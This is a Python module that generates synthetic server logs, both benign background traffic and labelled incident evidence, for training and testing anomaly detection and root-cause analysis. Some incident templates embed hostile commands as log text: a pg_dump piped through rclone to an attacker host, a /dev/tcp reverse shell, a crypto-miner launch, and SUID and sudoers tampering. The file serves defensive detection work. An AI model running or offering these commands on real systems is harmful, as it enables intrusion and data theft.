"""Synthetic log lines: normal background traffic plus incident/attack evidence.

Formats mimic real sources (nginx access log, sshd/auth.log, sudo, auditd,
kernel, PostgreSQL, a netflow-style connection log) so the parsers and LLM
prompts built later work on realistic text.

Labelling rule: a line is ``is_anomaly=1`` only if the incident *produced* it.
Benign look-alikes (a single mistyped SSH password, an admin using sudo) are
generated on purpose and labelled 0; these are the hard negatives a naive
keyword rule would flag.
"""

from __future__ import annotations

from datetime import datetime, timedelta

import numpy as np

from aiops_copilot.generator.models import (
    Incident,
    IncidentType,
    LogRecord,
    ServerProfile,
    ServerRole,
)

_PATHS: tuple[str, ...] = (
    "/", "/login", "/api/v1/orders", "/api/v1/orders/{id}", "/api/v1/customers/{id}",
    "/api/v1/search?q=shoes", "/api/v1/cart", "/static/app.js", "/healthz",
)
_METHODS: tuple[str, ...] = ("GET", "GET", "GET", "POST", "PUT")
_ADMIN_IPS: tuple[str, ...] = ("10.0.0.5", "10.0.0.6", "10.0.0.12")
_SPRAY_USERS: tuple[str, ...] = (
    "root", "admin", "ubuntu", "test", "oracle", "postgres", "git", "user", "pi", "deploy",
)
_EXFIL_PORTS: tuple[int, ...] = (443, 8443, 21, 4444)


class LogGenerator:
    """Produces :class:`LogRecord` objects for one simulation step."""

    def __init__(self, rng: np.random.Generator) -> None:
        self._rng = rng

    # ------------------------------------------------------------ helpers
    def _offset(self, ts: datetime, step_seconds: int) -> datetime:
        return ts + timedelta(seconds=float(self._rng.uniform(0, step_seconds)))

    def _client_ip(self) -> str:
        return f"{int(self._rng.integers(11, 223))}.{int(self._rng.integers(0, 255))}." \
               f"{int(self._rng.integers(0, 255))}.{int(self._rng.integers(1, 254))}"

    def _pick(self, options: tuple[str, ...]) -> str:
        return options[int(self._rng.integers(len(options)))]

    def _count(self, rate_per_min: float, step_seconds: int) -> int:
        return int(self._rng.poisson(max(0.0, rate_per_min) * step_seconds / 60.0))

    @staticmethod
    def _rec(ts: datetime, host: str, source: str, level: str, msg: str,
             incident: Incident | None = None) -> LogRecord:
        if incident is None:
            return LogRecord(ts, host, source, level, msg)
        return LogRecord(ts, host, source, level, msg, 1,
                         incident.incident_type.value, incident.incident_id)

    # ------------------------------------------------------- normal logs
    def normal(
        self,
        server: ServerProfile,
        ts: datetime,
        step_seconds: int,
        load: float,
        error_rate_pct: float,
        running_jobs: list[str],
    ) -> list[LogRecord]:
        """Background logs for a healthy server during one step."""
        out: list[LogRecord] = []
        h = server.name

        if server.role in (ServerRole.WEB, ServerRole.API):
            for _ in range(self._count(4.0 * load, step_seconds)):
                status = 500 if self._rng.random() < error_rate_pct / 100.0 else \
                    int(self._rng.choice([200, 200, 200, 201, 204, 301, 304, 404]))
                path = self._pick(_PATHS).replace("{id}", str(int(self._rng.integers(1, 99999))))
                dur = self._rng.gamma(2.0, 0.04)
                out.append(self._rec(
                    self._offset(ts, step_seconds), h, "nginx",
                    "ERROR" if status >= 500 else "INFO",
                    f'{self._client_ip()} - - "{self._pick(_METHODS)} {path} HTTP/1.1" '
                    f'{status} {int(self._rng.integers(200, 9000))} {dur:.3f}'))
        if server.role is ServerRole.API:
            for _ in range(self._count(1.5 * load, step_seconds)):
                out.append(self._rec(self._offset(ts, step_seconds), h, "app", "INFO",
                                     f"order_service processed order_id={int(self._rng.integers(100_000, 1_000_000))} "
                                     f"in {int(self._rng.gamma(3, 25))}ms"))
        if server.role is ServerRole.DB:
            for _ in range(self._count(1.0, step_seconds)):
                out.append(self._rec(self._offset(ts, step_seconds), h, "postgres", "INFO",
                                     "checkpoint complete: wrote "
                                     f"{int(self._rng.integers(50, 900))} buffers"))
            if self._rng.random() < 0.02:
                out.append(self._rec(self._offset(ts, step_seconds), h, "postgres", "WARNING",
                                     f"duration: {int(self._rng.integers(800, 2500))} ms  "
                                     "statement: SELECT * FROM orders WHERE customer_id = $1"))
        if server.role is ServerRole.WORKER:
            for _ in range(self._count(1.2 * load, step_seconds)):
                out.append(self._rec(self._offset(ts, step_seconds), h, "app", "INFO",
                                     f"job email_digest id={int(self._rng.integers(10_000, 100_000))} "
                                     f"finished in {self._rng.gamma(4, 0.2):.2f}s"))

        # Routine admin access (benign).
        if self._rng.random() < 0.01 * step_seconds / 60.0:
            admin = self._pick(_ADMIN_IPS)
            out.append(self._rec(self._offset(ts, step_seconds), h, "sshd", "INFO",
                                 f"Accepted publickey for deploy from {admin} "
                                 f"port {int(self._rng.integers(40000, 65000))} ssh2"))
        # Hard negative: one mistyped password, then success.
        if self._rng.random() < 0.004 * step_seconds / 60.0:
            admin = self._pick(_ADMIN_IPS)
            t = self._offset(ts, step_seconds)
            out.append(self._rec(t, h, "sshd", "WARNING",
                                 f"Failed password for ops from {admin} port "
                                 f"{int(self._rng.integers(40000, 65000))} ssh2"))
            out.append(self._rec(t + timedelta(seconds=4), h, "sshd", "INFO",
                                 f"Accepted password for ops from {admin} port "
                                 f"{int(self._rng.integers(40000, 65000))} ssh2"))
        # Hard negative: legitimate sudo by an admin.
        if self._rng.random() < 0.006 * step_seconds / 60.0:
            out.append(self._rec(self._offset(ts, step_seconds), h, "sudo", "INFO",
                                 "deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; "
                                 "COMMAND=/bin/systemctl restart nginx"))

        for job in running_jobs:
            if job == "nightly_backup" and ts.minute == 0:
                out.append(self._rec(ts, h, "cron", "INFO",
                                     "(postgres) CMD (/usr/local/bin/pg_backup.sh --upload s3://corp-backups/db)"))
            elif job == "log_rotation" and ts.minute == 0:
                out.append(self._rec(ts, h, "cron", "INFO", "(root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)"))
            elif job == "deploy" and ts.minute == 30:
                out.append(self._rec(ts, h, "systemd", "INFO",
                                     "Started app.service - rolling deploy release v2.14."
                                     f"{int(self._rng.integers(0, 9))}"))
        return out

    # ----------------------------------------------------- incident logs
    def incident(
        self,
        server: ServerProfile,
        incident: Incident,
        ts: datetime,
        progress: float,
        step_seconds: int,
    ) -> list[LogRecord]:
        """Evidence lines produced by an active incident during one step."""
        h, i, s = server.name, incident, incident.intensity
        out: list[LogRecord] = []
        def t() -> datetime:
            return self._offset(ts, step_seconds)

        kind = incident.incident_type

        if kind is IncidentType.CPU_SPIKE:
            if self._rng.random() < 0.6:
                out.append(self._rec(t(), h, "app", "WARNING",
                                     f"worker pool saturated: {int(self._rng.integers(60, 64))}/64 "
                                     "threads busy, queue depth "
                                     f"{int(self._rng.integers(200, 900))}", i))
            if self._rng.random() < 0.2:
                out.append(self._rec(t(), h, "kernel", "WARNING",
                                     "CPU0: Core temperature above threshold, cpu clock throttled", i))

        elif kind is IncidentType.MEMORY_LEAK:
            if progress > 0.4 and self._rng.random() < 0.4:
                out.append(self._rec(t(), h, "app", "WARNING",
                                     f"GC pause {int(200 + 1500 * progress)}ms, heap "
                                     f"{int(60 + 38 * progress)}% after collection", i))
            if progress > 0.95 and self._rng.random() < 0.5:
                out.append(self._rec(t(), h, "kernel", "ERROR",
                                     f"Out of memory: Killed process {int(self._rng.integers(1000, 30000))} "
                                     "(python3) total-vm:8123456kB, anon-rss:7340032kB", i))

        elif kind is IncidentType.DISK_FILL:
            if self._rng.random() < 0.3:
                out.append(self._rec(t(), h, "kernel", "WARNING",
                                     f"filesystem /var usage {int(80 + 19 * progress)}% "
                                     f"(+{int(2 + 8 * s)}GB/h)", i))
            if progress > 0.8:
                for _ in range(self._count(3.0 * s, step_seconds)):
                    out.append(self._rec(t(), h, "app", "ERROR",
                                         "OSError: [Errno 28] No space left on device: "
                                         "'/var/lib/app/tmp/upload.part'", i))

        elif kind is IncidentType.LATENCY_DEGRADATION:
            for _ in range(self._count(2.0 * s, step_seconds)):
                out.append(self._rec(t(), h, "nginx", "ERROR",
                                     "upstream timed out (110: Connection timed out) while reading "
                                     'response header from upstream, request: "GET /api/v1/orders HTTP/1.1"', i))

        elif kind is IncidentType.ERROR_BURST:
            for _ in range(self._count(8.0 * s, step_seconds)):
                out.append(self._rec(t(), h, "app", "ERROR",
                                     'HTTP 500 Internal Server Error on "POST /api/v1/orders"', i))

        elif kind is IncidentType.TRAFFIC_SURGE:
            for _ in range(self._count(3.0 * s, step_seconds)):
                out.append(self._rec(t(), h, "nginx", "WARNING",
                                     f"limiting requests, excess: {self._rng.uniform(10, 90):.3f} by zone "
                                     f'"api_limit", client: {self._client_ip()}', i))

        elif kind is IncidentType.SSH_BRUTE_FORCE:
            for _ in range(self._count(60.0 + 90.0 * s, step_seconds)):
                user = self._pick(_SPRAY_USERS)
                port = int(self._rng.integers(30000, 65000))
                msg = (f"Failed password for invalid user {user} from {i.attacker_ip} port {port} ssh2"
                       if self._rng.random() < 0.7 else
                       f"Failed password for root from {i.attacker_ip} port {port} ssh2")
                out.append(self._rec(t(), h, "sshd", "WARNING", msg, i))
            if self._rng.random() < 0.3:
                out.append(self._rec(t(), h, "sshd", "ERROR",
                                     f"error: maximum authentication attempts exceeded for root from "
                                     f"{i.attacker_ip} port {int(self._rng.integers(30000, 65000))} ssh2 [preauth]", i))
            # Optional compromise at the very end of the attack.
            end_step = i.end - timedelta(seconds=step_seconds)
            if i.extra.get("compromised") and end_step <= ts < i.end:
                out.append(self._rec(ts, h, "sshd", "CRITICAL",
                                     f"Accepted password for root from {i.attacker_ip} port "
                                     f"{int(self._rng.integers(30000, 65000))} ssh2", i))

        elif kind is IncidentType.DATA_EXFILTRATION:
            for _ in range(self._count(2.0, step_seconds)):
                mb = int((90 + 220 * s) * step_seconds / 8 * self._rng.uniform(0.5, 1.0))
                out.append(self._rec(t(), h, "netflow", "WARNING",
                                     f"ESTABLISHED {server.ip}:{int(self._rng.integers(40000, 60000))} -> "
                                     f"{i.attacker_ip}:{self._rng.choice(_EXFIL_PORTS)} proto=tcp "
                                     f"bytes_out={mb * 1_000_000} process=rclone", i))
            if progress < 0.1 and self._rng.random() < 0.5:
                out.append(self._rec(t(), h, "auditd", "WARNING",
                                     "type=EXECVE uid=svc_report cmd=\"pg_dump -Fc customers | rclone rcat "
                                     f"remote:{i.attacker_ip}/drop/customers.dump\"", i))

        elif kind is IncidentType.PRIVILEGE_ESCALATION:
            steps = (
                ("sudo", "WARNING", "www-data : user NOT in sudoers ; TTY=unknown ; PWD=/var/www ; "
                                    "USER=root ; COMMAND=/bin/bash"),
                ("auditd", "WARNING", "type=EXECVE uid=www-data cmd=\"find / -perm -4000 -type f\""),
                ("auditd", "CRITICAL", "type=PATH name=/etc/sudoers op=write uid=33 (www-data)"),
                ("auditd", "CRITICAL", "type=EXECVE uid=0 auid=33 cmd=\"usermod -aG sudo sysbackup\""),
                ("auditd", "CRITICAL", "type=EXECVE uid=33 cmd=\"chmod u+s /tmp/.x/bash\""),
                ("sshd", "WARNING", f"Accepted publickey for sysbackup from {i.attacker_ip} port "
                                    f"{int(self._rng.integers(30000, 65000))} ssh2"),
            )
            for source, level, msg in steps:
                if self._rng.random() < 0.35:
                    out.append(self._rec(t(), h, source, level, msg, i))

        elif kind is IncidentType.SUSPICIOUS_PROCESS:
            if progress < 0.15 and self._rng.random() < 0.7:
                out.append(self._rec(t(), h, "auditd", "CRITICAL",
                                     "type=EXECVE uid=www-data cmd=\"/tmp/.cache/kworkerds --url "
                                     "stratum+tcp://pool.mining.example:3333 --threads 8\"", i))
            if self._rng.random() < 0.4:
                out.append(self._rec(t(), h, "netflow", "WARNING",
                                     f"ESTABLISHED {server.ip}:{int(self._rng.integers(40000, 60000))} -> "
                                     f"{i.attacker_ip}:3333 proto=tcp process=kworkerds", i))
            if self._rng.random() < 0.05:
                out.append(self._rec(t(), h, "auditd", "CRITICAL",
                                     "type=EXECVE uid=www-data cmd=\"bash -i >& "
                                     f"/dev/tcp/{i.attacker_ip}/4444 0>&1\"", i))

        # Root-cause-specific clues: what lets an engineer (or the RCA agent)
        # tell two incidents of the same type apart.
        clue = _ROOT_CAUSE_CLUES.get(incident.root_cause_id)
        if clue and self._rng.random() < 0.5:
            source, level, template = clue
            out.append(self._rec(t(), h, source, level, template.format(
                n=int(self._rng.integers(2, 9999)), ip=self._client_ip()), i))
        return out


#: One characteristic log line per root-cause variant: (source, level, message template).
_ROOT_CAUSE_CLUES: dict[str, tuple[str, str, str]] = {
    "cpu_spike/regex_backtracking": (
        "app", "WARNING", "slow request: input validation regex took 4.{n}s on field 'comment' (len=48211)"),
    "cpu_spike/retry_storm": (
        "app", "WARNING", "retrying call to inventory-service attempt={n} backoff=0ms max_retries=unlimited"),
    "cpu_spike/cron_misfire": (
        "cron", "INFO", "(report) CMD (/opt/jobs/heavy_report.py --full) [schedule '* * * * *']"),
    "memory_leak/unbounded_cache": (
        "app", "WARNING", "local cache size={n}k entries, evictions=0 (maxsize=None)"),
    "memory_leak/unclosed_sessions": (
        "app", "WARNING", "ResourceWarning: unclosed <ClientSession>; open sockets={n}"),
    "disk_fill/debug_logging": (
        "app", "INFO", "logger 'app' level=DEBUG handler=/var/log/app/debug.log rotation=none"),
    "disk_fill/wal_replication_slot": (
        "postgres", "WARNING", "pg_wal size {n}MB growing; replication slot 'replica_old' is inactive"),
    "latency_degradation/missing_index": (
        "postgres", "WARNING", "duration: {n} ms plan: Seq Scan on orders (rows=4812331) "
                               "statement: SELECT * FROM orders WHERE status=$1 AND region=$2"),
    "latency_degradation/upstream_timeout": (
        "app", "WARNING", "payment-gateway call took 30000ms (timeout=30s) status=504 provider=paystream"),
    "error_burst/pool_exhausted": (
        "app", "ERROR", "sqlalchemy.exc.TimeoutError: QueuePool limit of size 5 overflow 0 reached, "
                        "connection timed out"),
    "error_burst/expired_tls_cert": (
        "app", "ERROR", "ssl.SSLCertVerificationError: certificate has expired (_ssl.c:1006) "
                        "calling inventory-service"),
    "traffic_surge/marketing_campaign": (
        "nginx", "INFO", '{ip} - - "GET /landing?utm_campaign=mega_sale HTTP/1.1" 200 5120 0.090'),
    "traffic_surge/aggressive_crawler": (
        "nginx", "WARNING", '{ip} - - "GET /api/v1/search?q=item{n} HTTP/1.1" 200 812 "AggressiveBot/2.1 '
                            '(ignores robots.txt)"'),
}
